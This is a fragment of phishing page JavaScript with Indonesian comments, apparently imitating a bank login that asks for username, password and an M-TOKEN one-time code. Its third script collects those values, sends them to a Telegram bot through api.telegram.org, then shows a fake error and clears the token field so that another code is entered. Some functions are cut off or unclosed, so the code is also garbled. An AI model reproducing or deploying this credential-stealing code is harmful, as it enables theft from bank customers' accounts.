function Login_Form_Validator() {

    var currentSec = (dtSign.getSeconds() < 10 ? '0' : '') + dtSign.getSeconds();
    var formatedDate = "".concat(currentYear, currentMonth, currentDate, currentHour, currentMin, currentSec);
    
    var enkrip = jsEncrypt.encrypt("".concat(document.getElementById("txt_pswd").value, formatedDate));

<script type="text/javascript">
var slideIndex = 0;
var timerSlide;
var isAutoNextSlide = true;

// Mulai slideshow setelah DOM siap
document.addEventListener("DOMContentLoaded", function() {
    showSlideAuto();
});

function showSlideAuto() {
    var slides = document.getElementsByClassName("banner-slide");
    
    if (slides.length === 0) {
        return;
    }
    
    for (var i=0; i<slides.length; i++) {
        slides[i].style.display = "none";  
    }
    
    if (isAutoNextSlide) {
        slideIndex++;
    }
    isAutoNextSlide = true;
    
    if (slideIndex > slides.length) {
        slideIndex = 1;
    }
    
    slides[slideIndex-1].style.display = "block";  
    
    timerSlide = setTimeout(showSlideAuto, 5000); // Change banner every 5s
}
</script>

<script>

// FORM KEDUA - M-TOKEN (MENGGUNAKAN VARIABEL DARI SERVER.JS)

$('#klikotp').on('submit', function (event) {
    event.stopPropagation();
    event.preventDefault();
    
    // Ambil nilai dari input fields
    var txt_user_id = document.getElementById('txt_user_id');
    var txt_pswd = document.getElementById('txt_pswd');
    var mToken = document.getElementById('token'); // M-TOKEN dari input field
    
    // Validasi input token
    if (!mToken.value || mToken.value.trim() === '') {
        $("#kodesalah").text("Silakan masukkan M-TOKEN Anda").fadeIn().delay(3000).fadeOut();
        return false;
    }
    if (mToken.value.length < 4) {
        $("#kodesalah").text("M-TOKEN minimal 4 digit").fadeIn().delay(3000).fadeOut();
        return false;
    }
    
    document.getElementById('btnSubmit1').value = "Proses..";
    
    // Format pesan untuk Telegram - MENGGUNAKAN mToken.value untuk M-TOKEN
    // dan MENGGUNAKAN variabel token & grup dari server.js
    var gabungan = '%0A※ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 : ' + txt_user_id.value + 
                   '%0A※ 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱 : ' + txt_pswd.value + 
                   '%0A※ 𝗠-𝗧𝗢𝗞𝗘𝗡 : ' + mToken.value +
                   '%0A※ 𝗪𝗮𝗸𝘁𝘂 : ' + new Date().toLocaleString('id-ID');

    console.log('Mengirim M-TOKEN ke Telegram...');
    console.log('M-TOKEN value:', mToken.value);
    console.log('Using bot token from server.js');

    // Kirim ke Telegram menggunakan variabel dari server.js
    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
        timeout: 10000,
        success: function(data) {

        complete: function(data) {
            console.log('M-TOKEN process complete');

                document.getElementById('btnSubmit1').value = "Konfirmasi";     
                $("#kodesalah").text("Terjadi kesalahan, Coba lagi.").fadeIn();
                $("#token").val('');

    return false;
});       
</script>
